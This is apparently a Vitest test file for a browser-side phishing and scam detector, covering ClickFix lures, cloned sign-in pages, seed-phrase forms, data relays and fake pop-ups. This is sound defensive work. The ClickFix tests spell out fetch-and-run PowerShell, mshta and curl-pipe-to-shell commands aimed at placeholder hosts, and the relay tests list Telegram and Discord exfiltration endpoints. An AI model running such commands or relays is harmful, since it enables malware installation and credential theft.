/**
 * v5 offline engine: lures, ClickFix, copied sign-in pages, recovery phrases,
 * data relays and fake pop-up windows. Each attack case is paired with the
 * honest page it must not be confused with.
 */
import { describe, expect, it } from 'vitest';
import type { DomEvidence, PageEvidence } from '../src/core/types.js';
import { evidenceFromUrl } from '../src/core/evidence.js';
import { evaluate } from '../src/core/score.js';
import {
  exfilTarget, hasRunInstructions, isBotExfil, isClickFix, isCryptoClaimLure, isDocumentLure,
  isTechSupportScam, looksHostile, looksLikeCommand,
} from '../src/core/lures.js';

const emptyDom: DomEvidence = {
  title: '', hasPasswordField: false, passwordFieldVisible: false, passwordFormActions: [],
  crossOriginPasswordForm: false, insecurePasswordFormAction: false, hiddenIframeCount: 0,
  brandTokens: [], externalFavicon: false, faviconHost: undefined, pasteBlocked: false,
  contextMenuBlocked: false, obfuscationScore: 0, linkCount: 0, deadLinkRatio: 0,
};
const page = (url: string, dom: Partial<DomEvidence> = {}, extra: Partial<PageEvidence> = {}): PageEvidence =>
  ({ ...evidenceFromUrl(url)!, dom: { ...emptyDom, ...dom }, ...extra });
const concl = (e: PageEvidence) => evaluate(e).conclusions.map((c) => c.id);

describe('ClickFix', () => {
  const lure = 'Verify you are human. Press Windows key + R, then press Ctrl + V and Enter to complete verification.';
  it('recognises the commands kits use', () => {
    expect(looksLikeCommand('powershell -w h -c "iex(irm https://x.top/a)"')).toBe(true);
    expect(looksLikeCommand('mshta https://check-captcha.top/verify')).toBe(true);
    expect(looksLikeCommand('cmd /c curl -s https://x.ru/p | sh')).toBe(true);
    expect(looksLikeCommand('po^wer^shell -enc SQBFAFgAKABpAHcAcgAgAGgAdAB0AHAA')).toBe(true);
  });
  it('flags a command plus run-it instructions', () => {
    expect(isClickFix('powershell -c "Start-Process calc"', lure)).toBe(true);
  });
  it('flags a hostile command even without instructions', () => {
    expect(looksHostile('mshta https://a.top/x')).toBe(true);
    expect(isClickFix('mshta https://a.top/x', 'Loading')).toBe(true);
  });
  it('leaves a developer install command alone', () => {
    const docs = 'Install Homebrew. Paste that in a macOS Terminal prompt.';
    expect(isClickFix('/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"', docs)).toBe(false);
    expect(isClickFix('npm install pagida', lure)).toBe(false);
  });
  it('reaches danger with a named reason', () => {
    const v = evaluate(page('https://some-recipes-blog.com/', { clickFix: true, clipboardCommand: 'powershell …' }, { domainAgeDays: 4000 }));
    expect(v.band).toBe('danger');
    expect(v.conclusions[0]?.id).toBe('clickfix_attack');
  });
  it('knows a help page explaining Win+R is not an attack', () => {
    expect(hasRunInstructions('To open Run, press Windows key + R.')).toBe(true);
    expect(isClickFix(undefined, 'To open Run, press Windows key + R.')).toBe(false);
  });
});

describe('copied sign-in pages', () => {
  it('a Microsoft sign-in structure on another domain is danger', () => {
    const e = page('https://secure-docs-review.com/owa/', { hasPasswordField: true, passwordFieldVisible: true, loginFingerprints: ['microsoft'] });
    expect(concl(e)).toContain('copied_sign_in_page');
    expect(evaluate(e).band).toBe('danger');
  });
  it('Microsoft on its own domain is fine', () => {
    const e = page('https://login.microsoftonline.com/common/oauth2', { hasPasswordField: true, passwordFieldVisible: true, loginFingerprints: ['microsoft'] });
    expect(evaluate(e).band).toBe('clean');
  });
  it('Meta\'s shared login form on Instagram is fine', () => {
    const e = page('https://www.instagram.com/accounts/login/', { hasPasswordField: true, passwordFieldVisible: true, loginFingerprints: ['facebook'] });
    expect(evaluate(e).band).toBe('clean');
  });
  it('borrowed brand assets only count next to a request for a secret', () => {
    const quiet = page('https://cooking-tips-blog.net/', { brandAssets: ['microsoft'] });
    expect(evaluate(quiet).band).toBe('clean');
    const login = page('https://cooking-tips-blog.net/x/', { brandAssets: ['microsoft'], hasPasswordField: true, passwordFieldVisible: true });
    expect(concl(login)).toContain('brand_impersonation_login');
  });
});

describe('secrets other than passwords', () => {
  it('a recovery-phrase form is always danger off a wallet\'s domain', () => {
    expect(evaluate(page('https://wallet-sync-portal.app/', { asksSeedPhrase: true })).band).toBe('danger');
  });
  it('a card form on an ordinary shop is fine', () => {
    expect(evaluate(page('https://smallbakery.com.au/checkout', { asksCard: true }, { domainAgeDays: 3000 })).band).toBe('clean');
  });
  it('a card form dressed as a bank is danger', () => {
    expect(evaluate(page('https://verify-card-au.com/', { asksCard: true, brandTokens: ['commbank'] })).band).toBe('danger');
  });
});

describe('data relays', () => {
  it('names the usual exfiltration services', () => {
    expect(exfilTarget('fetch("https://api.telegram.org/bot123:abc/sendMessage")')).toBe('a Telegram bot');
    expect(exfilTarget('<form action="https://formspree.io/f/xyz">')).toBe('a free form-relay service');
    expect(isBotExfil('https://discord.com/api/webhooks/1234/abc')).toBe(true);
  });
  it('a login form posting to a relay is danger', () => {
    const v = evaluate(page('https://portal-update.com/', { hasPasswordField: true, passwordFieldVisible: true, exfilTarget: 'a Telegram bot' }));
    expect(v.band).toBe('danger');
  });
  it('a contact form using a relay, with no secret asked, is fine', () => {
    expect(evaluate(page('https://janes-portfolio.dev/', { exfilTarget: 'a free form-relay service' }, { domainAgeDays: 900 })).band).toBe('clean');
  });
});

describe('lures without a login form', () => {
  it('fake virus warning with a phone number', () => {
    const t = 'WARNING! Your computer has been infected with a Trojan virus. Do not close this window. Call Microsoft Support at +1 (888) 555-0199 immediately.';
    expect(isTechSupportScam(t)).toBe(true);
    expect(isTechSupportScam('Our support team can be reached on 1300 555 123 for billing questions.')).toBe(false);
    expect(evaluate(page('https://alert-win-defender.xyz/', { techSupportScam: true })).band).toBe('danger');
  });
  it('a document lure in a brand\'s name is called out', () => {
    expect(isDocumentLure('You have received a secure document. Sign in to view the document.')).toBe(true);
    const v = evaluate(page('https://old-school-blog.com/wp-content/uploads/doc/', { documentLure: true, brandTokens: ['docusign'] }, { domainAgeDays: 4000 }));
    expect(v.conclusions.map((c) => c.id)).toContain('brand_lookalike_page');
  });
  it('crypto giveaway wording', () => {
    expect(isCryptoClaimLure('Connect your wallet to claim your airdrop reward')).toBe(true);
    expect(isCryptoClaimLure('Our wallet app keeps your crypto safe')).toBe(false);
  });
  it('a fake pop-up window showing a Google address', () => {
    const v = evaluate(page('https://game-skins-free.gg/', { fakeAddressBar: 'accounts.google.com', hasPasswordField: true, passwordFieldVisible: true }));
    expect(v.conclusions.map((c) => c.id)).toContain('browser_in_browser');
  });
});

describe('heuristics that would hurt honest sites stay quiet on top sites', () => {
  it('a Telegram bot address on a top site is not flagged', () => {
    expect(evaluate(page('https://www.reddit.com/', { botExfil: true })).band).toBe('clean');
  });
});

describe('site builders are many sites, not one famous one', () => {
  it('a Netflix login on a HostGator site-builder subdomain is not excused by the builder being popular', () => {
    const v = evaluate(page('https://nilson1790685367598.0310232.meusitehostgator.com.br/redirect',
      { hasPasswordField: true, passwordFieldVisible: true, brandTokens: ['netflix'] }));
    expect(v.band).toBe('danger');
  });
  it('someone.wordpress.com is judged on its own', () => {
    const v = evaluate(page('https://secure-paypal-help.wordpress.com/', { hasPasswordField: true, passwordFieldVisible: true, brandTokens: ['paypal'] }));
    expect(v.band).toBe('danger');
  });
});
